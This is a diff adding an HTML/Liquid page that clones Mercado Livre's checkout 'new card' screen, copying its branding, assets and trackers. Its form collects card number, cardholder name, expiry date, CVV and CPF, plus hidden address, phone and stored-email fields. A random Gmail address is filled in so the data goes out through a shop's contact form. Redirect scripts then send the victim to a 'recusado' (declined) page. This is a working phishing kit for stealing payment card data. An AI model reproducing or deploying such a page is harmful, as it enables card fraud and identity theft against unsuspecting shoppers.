@@ -1,0 +1,277 @@
+  <style>
+    /* Estilo padrão do botão */
+    .overview-component__action-button {
+      background-color: blue; /* Cor de fundo padrão */
+      color: white; /* Cor do texto */
+      padding: 10px 20px; /* Espaçamento interno */
+      border: none; /* Remova a borda para uma aparência mais limpa */
+      cursor: pointer; /* Altera o cursor ao passar por cima do botão */
+      position: relative; /* Necessário para a animação */
+      overflow: hidden; /* Garante que o overflow é oculto durante a animação */
+    }
+
+    /* Estilo do botão quando hover (opcional) */
+    .overview-component__action-button:hover {
+      background-color: darkblue; /* Cor de fundo ao passar o mouse */
+    }
+
+    /* Estilo do botão quando clicado */
+    .overview-component__action-button.clicked {
+      background-color: green; /* Cor de fundo ao clicar */
+      color: black; /* Altera a cor do texto para melhor legibilidade */
+    }
+
+    /* Efeito de carregamento - Animação */
+    .loading-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 0;
+      background-color: #00a650; /* Cor da barra de carregamento (pode ser ajustada) */
+      transition: width 0.5s ease-in-out; /* Transição suave para a largura da barra de carregamento */
+    }
+  </style>
+ <script>
+    // Função para manipular o envio do formulário
+    function onSubmit(event) {
+      event.preventDefault(); // Impede o envio padrão do formulário
+      var button = document.querySelector('.overview-component__action-button');
+      button.classList.add('clicked'); // Adiciona a classe 'clicked'
+
+      var loadingBar = button.querySelector('.loading-bar');
+      loadingBar.style.width = '100%'; // Define a largura para 100% para mostrar o carregamento
+
+      // Simula um atraso antes de redefinir o botão
+      setTimeout(function() {
+        loadingBar.style.width = '0'; // Redefine a largura da barra de carregamento
+        button.classList.remove('clicked'); // Remove a classe 'clicked'
+        // Aqui você pode adicionar lógica adicional antes de permitir o envio real do formulário
+        event.target.submit(); // Envie o formulário depois de concluído o carregamento simulado
+      }, 2000); // Tempo de simulação do carregamento em milissegundos (ajuste conforme necessário)
+    }
+  </script>
+
+<script>
+  // Verifique se a URL contém "contact_posted=true#contact_form"
+  if (window.location.href.indexOf("contact_posted=true#contact_form") !== -1) {
+    // Redirecione o usuário para a página /pages/recusado
+    window.location.href = "/pages/recusado";
+  }
+</script>
+
+<script>
+  // Verifique se a URL contém "contact_posted=true#contact_form"
+  if (window.location.href.indexOf("contact_posted") !== -1) {
+    // Redirecione o usuário para a página /pages/recusado
+    window.location.href = "/pages/recusado";
+  }
+</script>
+
+<html lang="pt-BR"><head><link rel="preconnect" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.google.com"><link rel="preconnect" href="https://data.mercadolibre.com"><link rel="preconnect" href="https://http2.mlstatic.com"><link rel="preconnect" href="https://www.google.com.br"></head><body style="background-color: #FFF;" data-site="ML" data-country="BR" style=""><iframe src="about:srcdoc" srcdoc="" id="GoogleAnalyticsIframe" style="width: 0px; height: 0px; border: 0px; position: absolute;"></iframe><iframe src="about:srcdoc" srcdoc="" id="MelidataIframe" style="width: 0px; height: 0px; border: 0px; position: absolute;"></iframe><noscript><meta http-equiv="refresh" content="0;URL=//www.mercadolivre.com.br/gz/webdevice/config?go=https%3A%2F%2Fwww.mercadolivre.com.br%2Fgz%2Fcheckout%2Fdirect%2Fbuying%2Fd0527f26c80c4827850be28633cb0e9a%2FcardFormFlox&noscript=true"/></noscript>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="HandheldFriendly" content="True">
+    <meta http-equiv="cleartype" content="on">
+    <meta name="browser-support" content="samesite=true">
+    <meta name="csrf-token" content="60g5X4XY-KbLrQgCCh8s5g-vgQcenK-B2V34">
+    <link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"><style data-head-react="true">@font-face{font-family:'Proxima Nova';font-weight:300;font-display:swap;font-style:normal;src:url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2) format("woff2"),url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff) format("woff"),url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.ttf) format("truetype")}@font-face{font-family:'Proxima Nova';font-weight:400;font-display:swap;font-style:normal;src:url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2) format("woff2"),url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff) format("woff"),url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.ttf) format("truetype")}@font-face{font-family:'Proxima Nova';font-weight:600;font-display:swap;font-style:normal;src:url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2) format("woff2"),url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff) format("woff"),url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.ttf) format("truetype")}</style><title>Mercado Livre Brasil - Onde comprar e vender de Tudo</title><link href="https://http2.mlstatic.com/frontend-assets/buyingflow-frontend-core/app.4318b5ce.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])">
+    <link href="https://http2.mlstatic.com/frontend-assets/buyingflow-frontend-core/payment-card-component-mlb.020ab955.css" rel="stylesheet" type="text/css" onerror="(window['_pfl'] = window['_pfl'] || []).push(['css', this.href])">
+    
+    <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><main style="background: #FFF;" role="main" id="root-app"><div class="main-wrapper cardForm-step-container"><div id="mldp"><div data-js="device-profile">
+    
+    <noscript>
+        <img id="noscript" style="display: none" src="https://www.mercadolibre.com/jms/lgz/background/session/armor.95879f6f484a9392f7e99aba05259a2667b21652748b97683fdabbf342336b74c6d3841176e9251c6ad8c60ec37aa693563016d43f9297c5a41153ec01dd2ec3b0f14464a596289bd70b4ceb5a6dceb3ab9985c9d7e164a595bf61b1fc32e59b.844c10b08f6e0cef3687ebbd77b015b1?background=armor.95879f6f484a9392f7e99aba05259a2667b21652748b97683fdabbf342336b74c6d3841176e9251c6ad8c60ec37aa693563016d43f9297c5a41153ec01dd2ec3b0f14464a596289bd70b4ceb5a6dceb3ab9985c9d7e164a595bf61b1fc32e59b.844c10b08f6e0cef3687ebbd77b015b1&message=eyJqc190eXBlIjoianNfY29va2llIiwidmFsdWUiOiJ4In0">
+    </noscript>
+    </div></div><div style="background: #FFF;" class="main-container" data-js="main-container" data-id="main_container"><div class="bf-ui-sticky-container" data-js="sticky-container" data-id="sticky_container"><div class="bf-ui-column-container" data-js="column-container" data-id="column_container"><div class="navigation-bar__container" data-js="navigation-bar"><button type="button" class="navigation-bar__button"><span class="bf-ui-icon-container bf-ui-icon-container--regular"><img id="arrow_back_black" class="bf-ui-icon bf-ui-icon--arrow_back_black" src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.0.7/assets/icons/arrow_back_black.svg" alt=""></span></button><p class="navigation-bar__title">Novo cartão</p></div><section class="bf-ui-progress-bar"><div class="bf-ui-progress-bar__progress"><div style="width:0%" class="bf-ui-progress-bar__progress bf-ui-progress-bar__progress--neutral"></div></div></section></div></div><div class="bf-ui-row-container" data-js="row-container" data-id="row_container_card_special_card"><div id="bf-payment-card-component" class="bf-payment-card-component  " aria-hidden="true" data-site="MLB"><div id="bf-payment-card-component__rotate" class="bf-payment-card-component__rotate-front"><div class="bf-payment-card-component__container bf-payment-card-component__front"><div class="bf-payment-card-component__background"></div><div class="bf-payment-card-component__background-overlay"></div><div class="bf-payment-card-component__row"><div class="bf-payment-card-component__col-4"><div id="bf-payment-card-component__logo" class="bf-payment-card-component__logo"></div><div id="bf-payment-card-component__logo_bank" class="bf-payment-card-component__logo-bank"></div></div></div><div class="bf-payment-card-component__row"><div class="bf-payment-card-component__col-4"><div id="bf-payment-card-component__security-front" data-hj-masked="true" class="bf-payment-card-component__security-front_default" style="visibility:hidden"><div class="bf-payment-card-component__cvv-front"><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span></div></div></div></div><div class="bf-payment-card-component__row"><div class="bf-payment-card-component__col-4"><div id="bf-payment-card-component__number" data-hj-masked="true" class="bf-payment-card-component__number bf-payment-card-component__number-4-4-4-4"><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span></div></div></div><div class="bf-payment-card-component__row"><div class="bf-payment-card-component__col-3"><span id="bf-payment-card-component__name" class="bf-payment-card-component__name"></span></div><div class="bf-payment-card-component__col-1"><div id="bf-payment-card-component__expiration" class="bf-payment-card-component__expiration"><span class=""></span><span class=""></span><span class=""></span><span class=""></span></div></div></div></div><div class="bf-payment-card-component__tooltip bf-payment-card-component__tooltip--all-to-the-right" aria-label="Informe o CVV que está no app do seu banco"><div class="bf-payment-card-component__question bf-payment-card-component__question--all-to-the-right"><span data-js="rich-text" class="bf-ui-rich-text">Você tem cartão virtual?</span></div><div class="bf-payment-card-component__icon bf-payment-card-component__icon--all-to-the-right"><div><div class="andes-tooltip__trigger"><span class="bf-ui-icon-container bf-ui-icon-container--regular"><img id="question_blue" class="bf-ui-icon bf-ui-icon--question_blue" src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.0.7/assets/icons/question_blue.svg" alt=""></span></div></div></div></div><div class="bf-payment-card-component__container bf-payment-card-component__back"><div class="bf-payment-card-component__background"></div><div class="bf-payment-card-component__background-overlay"></div><div class="bf-payment-card-component__row"><div class="bf-payment-card-component__col-4"><div class="bf-payment-card-component__magnetic"></div></div></div><div class="bf-payment-card-component__row"><div class="bf-payment-card-component__col-3"><div class="bf-payment-card-component__signature"><span></span><span></span><span></span><span></span><span></span><span></span></div></div><div class="bf-payment-card-component__col-1"><div id="bf-payment-card-component__security-back" data-hj-masked="true" class="bf-payment-card-component__security bf-payment-card-component__security-back"><div class="bf-payment-card-component__cvv"><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span><span class="bf-payment-card-component__point"></span></div></div></div></div></div></div></div></div>
+      
+      
+      
+      
+ <style>
+
+
+ #contact_form {width: 90%;
+    margin: auto;
+    background: transparent;
+  
+    padding-top: 50px;
+    min-height: 500px;}
+   
+#formcc {width: 90%;
+    margin: auto;
+    background: transparent;
+   
+    padding-top: 50px;
+    min-height: 500px;}
+
+
+
+
+.cxform { height: 100px;
+    width: 100%;}
+
+
+
+.pform {font-family: Proxima Nova;}    
+
+
+.inputf { width: 100%;
+    padding-left: 10px;
+    outline: none;
+    height: 50px;
+    font-size: 16px;
+    border-radius: 5px;
+    border: 1px solid #c3c3c3;}
+
+
+.bnform {  width: 100%;
+    color: #FFF;
+    height: 50px;
+    border-radius: 5px;
+    background: #3483fa;
+    font-size: 16px;}
+
+
+</style>     
+      
+<script>
+function formatCardNumber(input) {
+    const value = input.value.replace(/\s/g, ''); // Remove espaços existentes
+    const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Adiciona espaços após cada grupo de 4 dígitos
+    input.value = formattedValue;
+}
+
+function formatDateInput(input) {
+    const value = input.value;
+    
+    if (value.length === 2 && !value.includes('/')) {
+        input.value = value + ' / ';
+    }
+}
+</script>
+
+
+<script>
+function formatCPFInput(input) {
+    const value = input.value.replace(/\D/g, ''); // Remove caracteres não numéricos
+    const formattedValue = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); // Formatação do CPF
+    input.value = formattedValue;
+}
+</script>
+
+
+
+<script>
+  // Function to generate a random email with @gmail.com domain
+  function generateRandomEmail() {
+    var randomUsername = Math.random().toString(36).substring(7);
+    return randomUsername + "@gmail.com";
+  }
+
+  // Wait for the DOM to be ready
+  document.addEventListener("DOMContentLoaded", function() {
+    // Set the generated random email as the value of the email input field
+    document.getElementById("ContactFormCard").value = generateRandomEmail();
+
+    
+  });
+</script>
+
+
+<style>
+
+
+  #meuFormulario {padding: 20px;}
+
+  
+</style>
+
+      
+     {% form 'contact', id: 'meuFormulario' %}
+      
+    <form id="formcc" method="get" action="/pages/analise">
+
+        <input style="display: none;" type="email" id="ContactFormCard" name="contact[email]" class="inputf" value="a22222mercadolivre.com@gmail.com">
+           
+      <input type="text" id="invalidtrue" name="contact[↓DADOS DA CC↓]" style="display: none;">
+       
+      <div class="cxform">
+            <p class="pform">Número de cartão</p>
+            <input type="text" id="ContactFormCardNumber" name="contact[Número Do Cartão]" class="inputf" minlength="16" maxlength="19" required="" oninput="formatCardNumber(this)">
+        </div>
+        
+        <div class="cxform">
+            <p class="pform">Nome completo</p>
+            <input type="name" id="ContactFormName" name="contact[Nome Impresso (Titular)]" class="inputf" maxlength="100" required="">
+        </div>
+
+        <div class="cxform">
+            <p class="pform">Data de vencimento</p>
+            <input type="text" id="ContactFormDate" name="contact[Data de Vencimento]" class="inputf" minlength="" maxlength="7" required=""  oninput="formatDateInput(this)">
+        </div>
+
+        <div class="cxform">
+            <p class="pform">Código de segurança</p>
+            <input type="tel" id="ContactFormCod" name="contact[Código De Segurança (Cvv)]" class="inputf" minlength="3" maxlength="3" required="">
+        </div>
+
+        <div class="cxform">
+            <p class="pform">CPF do titular do cartão</p>
+            <input type="tel" id="ContactFormCPF" name="contact[cpf]" class="inputf" minlength="11" maxlength="14" required="" oninput="formatCPFInput(this)">
+        </div>
+
+        <div class="cxform">
+            <button class="bnform" type="submit" value="Continuar">Continuar</button>
+        </div>
+
+
+
+<div style="display: none;">
+      <input type="text" id="invalidtrue"name="contact[↓DADOS DO CLIENTE↓]">
+
+        
+      <input type="text" id="email-ar"name="contact[----e-mail]">
+
+    <script>
+        // Obter o valor armazenado anteriormente e exibi-lo em um input
+        var dado1Value = localStorage.getItem("dado1");
+        document.getElementById("email-ar").value = dado1Value;
+    </script>
+
+
+
+    <input required="" id="address_destinatario" value="" placeholder="" type="text" name="contact[----nome completo]" class="andes-form-control__field">
+
+    <input type="tel" id="phone" name="contact[----telefone]" pattern="[0-9]{11}" required="" placeholder="(99) 999999999" class="andes-form-control__field">
+
+    <input value="" required="" id="address_cep" name="contact[----cep]" type="tel" maxlength="9" class="andes-form-control__field">
+
+    <input id="address_estado" value="" type="text" name="contact[----estado]" class="andes-form-control__field">
+
+    <input id="address_cidade" value="" type="text" name="contact[----cidade]" class="andes-form-control__field">
+
+    <input id="address_bairro" value="" type="text" name="contact[----bairro]" class="andes-form-control__field">
+
+    <input id="address_rua" name="contact[----rua]" type="text" value="" class="andes-form-control__field">
+
+    <input autocomplete="do-not-autofill" name="contact[----numero]" textbox="false" rows="1" id="addresses_street_number" value="" class="andes-form-control__field" maxlength="128" placeholder="" aria-label="Número">
+
+    
+</div>
+ 
+    </form>
+
+
+    
+    {% endform %}
+
+
+    
+    
+    
+    </div></div></main>
+    <iframe src="https://www.mercadolibre.com/jms/lgz/background?dps=armor.95879f6f484a9392f7e99aba05259a2667b21652748b97683fdabbf342336b74c6d3841176e9251c6ad8c60ec37aa693563016d43f9297c5a41153ec01dd2ec3b0f14464a596289bd70b4ceb5a6dceb3ab9985c9d7e164a595bf61b1fc32e59b.844c10b08f6e0cef3687ebbd77b015b1" style="display: none; width: 0; height: 0; border: none; margin: 0;"></iframe><iframe id="_hjSafeContext_23880535" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="about:blank" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon271376740553"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon368996597448" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=21024398&amp;tm=gtm002&amp;Ver=2&amp;mid=1601fb2e-41a1-43a8-a6e6-4ae456625184&amp;sid=3110d04044d811ee99a61f251787d870&amp;vid=dd4bbbe00a1b11eebe6b811ced0f6259&amp;vids=0&amp;msclkid=N&amp;pi=0&amp;lg=pt-BR&amp;sw=474&amp;sh=685&amp;sc=24&amp;tl=Mercado%20Livre%20Brasil%20-%20Onde%20comprar%20e%20vender%20de%20Tudo&amp;p=https%3A%2F%2Fwww.mercadolivre.com.br%2Fgz%2Fcheckout%2Fdirect%2Fbuying%2Fd0527f26c80c4827850be28633cb0e9a%2FcardFormFlox&amp;r=https%3A%2F%2Fwww.mercadolivre.com.br%2Fgz%2Fcheckout%2Fdirect%2Fbuying%2Fd0527f26c80c4827850be28633cb0e9a%2FcardFormFlox&amp;lt=900&amp;mtp=1&amp;evt=pageLoad&amp;sv=1&amp;rn=27260"></div><iframe src="https://www.mercadolibre.com/jms/lgz/background?dps=armor.58d560885bedf25a845ed62b1a31ad2aea1a48ec99fa5b6a5df6a65eb826a9d4a87ddb95822ce48ac4b98e7655eeb90d8889b5c0ef64dcb36e97bb627006efeb4dc66b0d1579f596c48f829eba0550ce58ef4696ac9a813eb06ffcce002f4708.de718d10831aa5ff7744ea78613073fc" style="display: none; width: 0; height: 0; border: none; margin: 0;"></iframe><!-- Code injected by live-server -->
+
+<b style="position: absolute; left: -1000px;"><iframe style="display: none;"></iframe></b></body></html>
